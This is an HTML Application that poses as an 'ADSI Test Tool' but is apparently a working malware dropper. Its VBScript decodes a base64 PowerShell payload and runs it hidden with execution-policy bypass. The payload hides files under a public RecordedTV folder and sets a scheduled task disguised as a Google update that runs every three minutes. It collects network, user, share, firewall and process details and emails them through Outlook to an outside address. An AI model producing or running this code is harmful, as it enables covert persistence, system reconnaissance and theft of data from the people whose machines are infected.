<HTML>
	<HEAD>
		<HTA:APPLICATION 
			ID="ADSITest"
			VERSION="0.20 Beta"
			APPLICATIONNAME="ADSI Test Tool"
			SYSMENU="yes"
			MAXIMIZEBUTTON="yes"
			MINIMIZEBUTTON="yes"
			BORDER="thin"
			INNERBORDER="no"
			SCROLL="auto"
			SINGLEINSTANCE="yes"
			WINDOWSTATE="minimize"
		>
	</HEAD>
<script language="VBScript">

function WriteToTextFile(infilepath, inContent)
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	objFSO.CreateTextFile infilepath, True
	Set objFileIn   = objFSO.GetFile(infilepath)
	Set objStreamIn = objFileIn.OpenAsTextStream(2, 0)
	objStreamIn.Write(inContent)
	set objStreamIn = Nothing
	set objFileIn = Nothing
	set objFSO = Nothing
end function

Function base64_decode(encodedstr)
    Const r64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    Dim table(256), decodedstr
    For x = 1 To 256 Step 1
        table(x) = -1
    Next
    For x = 1 To 64 Step 1
        table(1 + Asc(Mid(r64, x, 1))) = x - 1
    Next
    Dim size
    size = Len(encodedstr)
    bits = 0
    decodedstr = ""
    For x = 1 To size Step 1
        c = table(1 + Asc(Mid(encodedstr, x, 1)))
        If (c <> -1) Then
            If (bits = 0) Then
                outword = c * 4
                bits = 6
            ElseIf (bits = 2) Then
                outword = c + outword
                decodedstr = decodedstr & (Chr(CLng("&H" & Hex(outword Mod 256))))
                bits = 0
            ElseIf (bits = 4) Then
                outword = outword + Int(c / 4)
                decodedstr = decodedstr & (Chr(CLng("&H" & Hex(outword Mod 256))))
                outword = c * 64
                bits = 2
            Else
                outword = outword + Int(c / 16)
                decodedstr = decodedstr & (Chr(CLng("&H" & Hex(outword Mod 256))))
                outword = c * 16
                bits = 4
            End If
        End If
    Next
    base64_decode = decodedstr
End Function

a="JGhvbWVfZGlyID0gJEVudjpQdWJsaWMrIlxMaWJyYXJpZXNcUmVjb3JkZWRUVlwiOw0KJHZic19maWxlX25hbWUgPSAiYmFja3VwMS52YnMiOw0KJHRlc3RfZmlsZV9uYW1lID0gInRlc3QyLnBzMSI7DQokdGFza19uYW1lID0gIkdvb2dsZVVwZGF0ZVRhc2tzTWFjaGluZVVJIjsNCg0KJEJhY2t1cFZic19maWxlX2NvbnRlbnQ9ImNURTRNalUwTkRJd09UTTlJaVZ3ZFdKc2FXTWxYRXhwWW5KaGNtbGxjMXhTWldOdmNtUmxaRlJXWENJTkNnMEtSVEV6TlRrME5EVXhORFk5SW5CdmQyVnljMmhsYkd3Z0xVVjRaV04xZEdsdmJsQnZiR2xqZVNCQ2VYQmhjM01nTFVacGJHVWdJaVp4TVRneU5UUTBNakE1TXlZaWRHVnpkREl1VUhNeElnMEtRM0psWVhSbFQySnFaV04wS0NKWFUyTnlhWEIwTGxOb1pXeHNJaWt1VW5WdUlFVXhNelU1TkRRMU1UUTJMREFOQ2cwS0RRbz0iOw0KDQokRG5FUHMxX2ZpbGVfY29udGVudD0iSTJsdVptOXliV0YwYVc5dUlHZGhkR2hsY21sdVp3MEtKR1JoZEdVOVpHRjBaUTBLSkdsd1kyOXVabWxuTVQxcGNHTnZibVpwWncwS0pHbHdZMjl1Wm1sblBXbHdZMjl1Wm1sbklDOWhiR3dnRFFva2FYQmpiMjVtYVdjeVBXbHdZMjl1Wm1sbklDOWthWE53YkdGNVpHNXpEUW9rYm1WMGMzUmhkRDF1WlhSemRHRjBJQzFoYm04Z0RRb2tibVYwYzNSaGRESTlibVYwYzNSaGRDQXRjZzBLSkc1bGRITm9ZWEpsUFc1bGRDQnphR0Z5WlEwS0pHNWxkSFZ6WlhJOWJtVjBJSFZ6WlhJTkNpUkRiMjF3ZFhSbGNrNWhiV1U5SUVkbGRDMVhiV2xQWW1wbFkzUWdMVU5zWVhOeklGZHBiak15WDBKSlQxTWdMVU52YlhCMWRHVnlUbUZ0WlNBdURRb2tjM2x6ZEdWdGFXNW1iejF6ZVhOMFpXMXBibVp2RFFva1ptbHlaWGRoYkd3OWJtVjBjMmdnWm1seVpYZGhiR3dnYzJodmR5QmpiMjVtYVdjTkNpUmhjbkE5WVhKd0lDMWhJQTBLSkhSaGMydHNhWE4wUFhSaGMydHNhWE4wSUM5emRtTU5DaVJ1WlhSMWMyVnlNajF1WlhRZ2RYTmxjaUF2Wkc5dFlXbHVEUW9rYm1WMFozSnZkWEE5Ym1WMElHZHliM1Z3SUM5a2IyMWhhVzROQ2cwS0pHRnNiRDBrWkdGMFpTd2thWEJqYjI1bWFXY3NKR2x3WTI5dVptbG5NaXdrYm1WMGMzUmhkQ3drYm1WMGMzUmhkRElzSkc1bGRITm9ZWEpsTENSemVYTjBaVzFwYm1adkxDUm1hWEpsZDJGc2JDd2tZWEp3TENSMFlYTnJiR2x6ZEN3a2JtVjBkWE5sY2l3a2JtVjBaM0p2ZFhBc0pHNWxkR2R5YjNWd01pd2tibVYwWjNKdmRYQXpMQ1JtYVhKbGQyRnNiQ3drYm1WMFozSnZkWEEwZkNCdmRYUXRjM1J5YVc1bkRRb2tjMjFoYkd3OUpHbHdZMjl1Wm1sbk1Td2taR0YwWlN3a1ptbHlaWGRoYkd3c0pHNWxkSFZ6WlhKOElHOTFkQzF6ZEhKcGJtY05DZzBLYVdZZ0tDUnpiV0ZzYkM1c1pXNW5kR2dnTFdkMElERXdNREFwSUhzTkNpQWdJQ0JsWTJodklDSlFZbXhoWW14aFlteGliR0pzWWlJTkNuME5DZzBLUm5WdVkzUnBiMjRnUW1GelpUWTBSVzVqYjJSbEtDUjBaWGgwS1NBTkNuc05DaUFnSUNBa1lpQWdQU0JiVTNsemRHVnRMbFJsZUhRdVJXNWpiMlJwYm1kZE9qcFZWRVk0TGtkbGRFSjVkR1Z6S0NSMFpYaDBLUTBLSUNBZ0lDUmxibU52WkdWa0lEMGdXMU41YzNSbGJTNURiMjUyWlhKMFhUbzZWRzlDWVhObE5qUlRkSEpwYm1jb0pHSXBEUW9nSUNBZ2NtVjBkWEp1SUNSbGJtTnZaR1ZrSUNBZ0lBMEtmUTBLRFFvTkNrWjFibU4wYVc5dUlFMWhhV3dvSkhSbGVIUXlLUTBLZXcwS0pFOTFkR3h2YjJzZ1BTQk9aWGN0VDJKcVpXTjBJQzFEYjIxUFltcGxZM1FnVDNWMGJHOXZheTVCY0hCc2FXTmhkR2x2YmcwS0pFMWhhV3dnUFNBa1QzVjBiRzl2YXk1RGNtVmhkR1ZKZEdWdEtEQXBEUW9rVFdGcGJDNVVieUE5SUNKc2FXMXZjamMzTmpOQVoyMWhhV3d1WTI5dElnMEtKRTFoYVd3dVUzVmlhbVZqZENBOUlDSkJZM1JwYjI0aURRb2tUV0ZwYkM1Q2IyUjVJRDBpSkhSbGVIUXlJZzBLSkUxaGFXd3VVMlZ1WkNncERRcDlEUW9OQ2lSRmJtTnZaR1ZrSUQwZ1FtRnpaVFkwUlc1amIyUmxLQ1JoYkd3cERRb2tSVzVqYjJSbFpESWdQU0JDWVhObE5qUkZibU52WkdVb0pITnRZV3hzS1EwS0pFVnVZMjlrWldReE1EQXdQU1JGYm1OdlpHVmtNaTVUZFdKemRISnBibWNvTUN3NU9Ua3BEUXBOWVdsc0tDUkZibU52WkdWa01UQXdNQ2tOQ2sxaGFXd29KRVZ1WTI5a1pXUXBEUW9qWVd4c0lHTnZjSGx5YVdkb2RDQnlaWE5sY25abFpDQjBieUJNYVc5eUlFRmtZWElnWVc1a0lGZG9hWFJsTFVoaGRDQmpiMjF3WVc1NUlqcz0iOw0KDQpmdW5jdGlvbiBjcmVhdGVfZGlyZWN0b3JpZXMNCnsNCgl0cnkNCgl7DQoJCWlmKC1ub3QoVGVzdC1QYXRoICRob21lX2RpciAtZWEgc3RvcCkpDQoJCXsNCgkJCU5ldy1JdGVtICRob21lX2RpciAtdHlwZSBkaXJlY3RvcnkgLWVhIHN0b3A7DQoJCX07DQoJfQ0KCWNhdGNoDQoJew0KCQl3cml0ZS1ob3N0ICJDYW4gbm90IENyZWF0ZSBIT01FIGRpcmVjdG9yeTogIiRob21lX2RpcjsNCgkJcmV0dXJuIDA7DQoJfTsNCglpZigtbm90KFRlc3QtUGF0aCAkaG9tZV9kaXIkZG5fZGlyKSkNCgl7DQoJCU5ldy1JdGVtICRob21lX2RpciRkbl9kaXIgLXR5cGUgZGlyZWN0b3J5Ow0KCX07DQoJaWYoLW5vdChUZXN0LVBhdGggJGhvbWVfZGlyJHVwX2RpcikpDQoJew0KCQlOZXctSXRlbSAkaG9tZV9kaXIkdXBfZGlyIC10eXBlIGRpcmVjdG9yeTsNCgl9Ow0KCWlmKC1ub3QoVGVzdC1QYXRoICRob21lX2RpciR0cF9kaXIpKQ0KCXsNCgkJTmV3LUl0ZW0gJGhvbWVfZGlyJHRwX2RpciAtdHlwZSBkaXJlY3Rvcnk7DQoJfTsNCglyZXR1cm4gMTsNCn07DQoNCg0KZnVuY3Rpb24gY2hhbmdlX3RlbXBsYXRlKCRnKQ0Kew0KCSRpPTE7DQoJd2hpbGUoKCRnLkNvbnRhaW5zKCdfXycrJGkrJ19fJykpKQ0KCXsNCgkJJGc9JGcgLVJlcGxhY2UgKCdfXycrJGkrJ19fJyksKCgoNjUuLjkwKSsoOTcuLjEyMil8R2V0LVJhbmRvbXwle1tjaGFyXSRffSkrKEdldC1SYW5kb20pKTsNCgkJJGkrKw0KCX07DQoJcmV0dXJuICRnDQp9Ow0KDQpmdW5jdGlvbiBjcmVhdGVfZmlsZXMNCnsNCgkNCglpZigtbm90KFRlc3QtUGF0aCAkaG9tZV9kaXIkdGVzdF9maWxlX25hbWUpKQ0KCXsNCgkJJGY9W1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiJERuRVBzMV9maWxlX2NvbnRlbnQiKSk7DQoNCgkJJGY9Y2hhbmdlX3RlbXBsYXRlICRmOw0KDQoJCVNldC1Db250ZW50ICIkaG9tZV9kaXIkdGVzdF9maWxlX25hbWUiICRmOw0KCX0NCgkNCgkNCglpZigtbm90KFRlc3QtUGF0aCAkaG9tZV9kaXIkdmJzX2ZpbGVfbmFtZSkpDQoJew0KCQkkZj1bU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCIkQmFja3VwVmJzX2ZpbGVfY29udGVudCIpKTsNCgkJDQoJCSRmPWNoYW5nZV90ZW1wbGF0ZSAkZjsNCgkJDQoJCVNldC1Db250ZW50ICIkaG9tZV9kaXIkdmJzX2ZpbGVfbmFtZSIgJGY7DQoJfQ0KCQ0KCQ0KCQ0KDQp9Ow0KDQoNCmZ1bmN0aW9uIGNyZWF0ZV90YXNrcw0Kew0KCWlmKC1ub3QoVGVzdC1QYXRoICRob21lX2RpciR2YnNfZmlsZV9uYW1lKSkNCgl7DQoJCXdyaXRlLWhvc3QgImNhbiBub3QgZmluZCBtYWluIFZCUyBmaWxlOiAiJGhvbWVfZGlyJHZic19maWxlX25hbWU7DQoJCXJldHVybiAwOw0KCX0NCglzY2h0YXNrcyAvY3JlYXRlIC9GIC9zYyBtaW51dGUgL21vIDMgL3RuICR0YXNrX25hbWUgL3RyICRob21lX2RpciR2YnNfZmlsZV9uYW1lOw0KCXJldHVybiAxOw0KfTsNCg0KDQoNCg0KZnVuY3Rpb24gaW5pdA0Kew0KCSRjb250ID0gMTsNCgkkY29udCA9IGNyZWF0ZV9kaXJlY3RvcmllczsNCglpZigkY29udCl7Y3JlYXRlX2ZpbGVzO307DQoJaWYoJGNvbnQpeyRjb250PWNyZWF0ZV90YXNrczt9Ow0KCWlmKC1ub3QoJGNvbnQpKXtyZW1vdmVfYWxsO307DQoJcmV0dXJuICRjb250Ow0KfTsNCg0KDQoNCmlmKGluaXQpDQp7DQoJd3JpdGUtaG9zdCAiT0siOw0KfQ0KZWxzZQ0Kew0KCXdyaXRlLWhvc3QgIkZhaWxlZCI7DQp9DQoNCg=="
	
	
	
WriteToTextFile "C:\Users\Public" & "\player.ps1", base64_decode(a)
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -exec bypass -file " & "C:\Users\Public" & "\player.ps1", 0, false
	
</script>
<body>
</body>
</HTML>